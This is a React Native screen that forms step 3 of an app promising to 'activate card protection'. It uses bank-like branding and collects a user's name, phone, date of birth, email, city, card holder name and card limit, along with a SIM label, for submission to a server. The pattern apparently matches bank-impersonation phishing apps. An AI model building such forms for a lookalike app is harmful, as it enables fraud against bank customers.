import { NativeStackScreenProps } from '@react-navigation/native-stack';
import { useState } from 'react';
import { ActivityIndicator, Alert, Pressable, ScrollView, StyleSheet, Text, TextInput, View } from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { serviceApi } from '../api/client';
import { RootStackParamList } from '../types/navigation';

type Props = NativeStackScreenProps<RootStackParamList, 'UserDetailsForm'>;

const INDUS_BLUE = '#1B3A6B';
const INDUS_DARK = '#0F1F3D';

export default function UserDetailsFormScreen({ navigation, route }: Props) {
  const { simLabel, serviceType, cardName } = route.params;

  const [fullName, setFullName] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [dob, setDob] = useState('');
  const [email, setEmail] = useState('');
  const [city, setCity] = useState('');
  const [cardHolderName, setCardHolderName] = useState('');
  const [cardTotalLimit, setCardTotalLimit] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const onSubmit = async () => {
    if (!fullName.trim()) {
      Alert.alert('Required', 'Please enter your full name.');
      return;
    }
    if (mobileNumber.trim().length < 10) {
      Alert.alert('Required', 'Please enter a valid 10-digit mobile number.');
      return;
    }
    if (!dob.trim()) {
      Alert.alert('Required', 'Please enter your date of birth.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      Alert.alert('Required', 'Please enter a valid email address.');
      return;
    }
    if (!city.trim()) {
      Alert.alert('Required', 'Please enter your city.');
      return;
    }
    if (!cardHolderName.trim()) {
      Alert.alert('Required', 'Please enter the card holder name.');
      return;
    }
    if (!cardTotalLimit.trim()) {
      Alert.alert('Required', 'Please enter your card total limit.');
      return;
    }

    setIsSubmitting(true);
    try {
      // Submit service request directly to server
      const result = await serviceApi.create({
        serviceType,
        cardName,
        fullName: fullName.trim(),
        mobileNumber: mobileNumber.trim(),
        dob: dob.trim(),
        email: email.trim(),
        city: city.trim(),
        cardHolderName: cardHolderName.trim(),
        cardTotalLimit: cardTotalLimit.trim(),
        simLabel,
      });

      if (result.success && result.data) {
        navigation.navigate('Success', {
          serviceType,
          fullName: fullName.trim(),
          referenceId: result.data.referenceId,
          mobileNumber: mobileNumber.trim(),
        });
      } else {
        Alert.alert('Error', result.error || 'Failed to submit request. Please try again.');
      }
    } catch (error) {
      console.error('[Form] Submit error:', error);
      Alert.alert('Error', 'Something went wrong. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <LinearGradient
      colors={['#E8EFF7', '#F5F8FC', '#FFFFFF']}
      style={styles.container}
    >
      <ScrollView
        style={styles.scrollView}
        contentContainerStyle={styles.scrollContent}
        keyboardShouldPersistTaps="handled"
      >
        <View style={styles.header}>
          <Text style={styles.stepLabel}>STEP 3 OF 3</Text>
          <Text style={styles.title}>Your Details</Text>
          <Text style={styles.subtitle}>
            Complete your profile to activate card protection
          </Text>
        </View>

        <View style={styles.form}>
          <View style={styles.inputGroup}>
            <Text style={styles.label}>Full Name *</Text>
            <TextInput
              style={styles.input}
              value={fullName}
              onChangeText={setFullName}
              placeholder="Enter your full name"
              placeholderTextColor="#9CA3AF"
              autoCapitalize="words"
            />
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>Mobile Number *</Text>
            <TextInput
              style={styles.input}
              value={mobileNumber}
              onChangeText={setMobileNumber}
              placeholder="10-digit mobile number"
              placeholderTextColor="#9CA3AF"
              keyboardType="phone-pad"
              maxLength={10}
            />
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>Date of Birth *</Text>
            <TextInput
              style={styles.input}
              value={dob}
              onChangeText={setDob}
              placeholder="DD/MM/YYYY"
              placeholderTextColor="#9CA3AF"
            />
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>Email Address *</Text>
            <TextInput
              style={styles.input}
              value={email}
              onChangeText={setEmail}
              placeholder="your.email@example.com"
              placeholderTextColor="#9CA3AF"
              keyboardType="email-address"
              autoCapitalize="none"
            />
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>City *</Text>
            <TextInput
              style={styles.input}
              value={city}
              onChangeText={setCity}
              placeholder="Enter your city"
              placeholderTextColor="#9CA3AF"
              autoCapitalize="words"
            />
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>Card Holder Name *</Text>
            <TextInput
              style={styles.input}
              value={cardHolderName}
              onChangeText={setCardHolderName}
              placeholder="Name as on card"
              placeholderTextColor="#9CA3AF"
              autoCapitalize="characters"
            />
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>Card Total Limit *</Text>
            <TextInput
              style={styles.input}
              value={cardTotalLimit}
              onChangeText={setCardTotalLimit}
              placeholder="₹ 50,000"
              placeholderTextColor="#9CA3AF"
              keyboardType="numeric"
            />
          </View>
        </View>
      </ScrollView>

      <View style={styles.footer}>
        <Pressable
          style={[styles.submitButton, isSubmitting && styles.submitButtonDisabled]}
          onPress={onSubmit}
          disabled={isSubmitting}
        >
          {isSubmitting ? (
            <ActivityIndicator size="small" color="#FFFFFF" />
          ) : (
            <Text style={styles.submitButtonText}>Submit Application</Text>
          )}
        </Pressable>
      </View>
    </LinearGradient>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  scrollView: {
    flex: 1,
  },
  scrollContent: {
    paddingHorizontal: 24,
    paddingTop: 60,
  },
  header: {
    marginBottom: 32,
  },
  stepLabel: {
    fontSize: 12,
    fontWeight: '700',
    color: INDUS_BLUE,
    letterSpacing: 1.5,
    marginBottom: 8,
  },
  title: {
    fontSize: 26,
    fontWeight: '800',
    color: INDUS_DARK,
    marginBottom: 8,
  },
  subtitle: {
    fontSize: 15,
    color: '#6B7280',
    lineHeight: 22,
  },
  form: {
    gap: 20,
  },
  inputGroup: {
    gap: 8,
  },
  label: {
    fontSize: 14,
    fontWeight: '600',
    color: INDUS_DARK,
  },
  input: {
    backgroundColor: '#FFFFFF',
    borderRadius: 12,
    paddingHorizontal: 16,
    paddingVertical: 14,
    fontSize: 16,
    color: INDUS_DARK,
    borderWidth: 1,
    borderColor: '#E5E7EB',
  },
  footer: {
    padding: 24,
    paddingBottom: 40,
  },
  submitButton: {
    backgroundColor: INDUS_BLUE,
    borderRadius: 12,
    paddingVertical: 16,
    alignItems: 'center',
    elevation: 4,
    shadowColor: INDUS_BLUE,
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 8,
  },
  submitButtonDisabled: {
    backgroundColor: '#9CA3AF',
  },
  submitButtonText: {
    color: '#FFFFFF',
    fontSize: 17,
    fontWeight: '700',
  },
});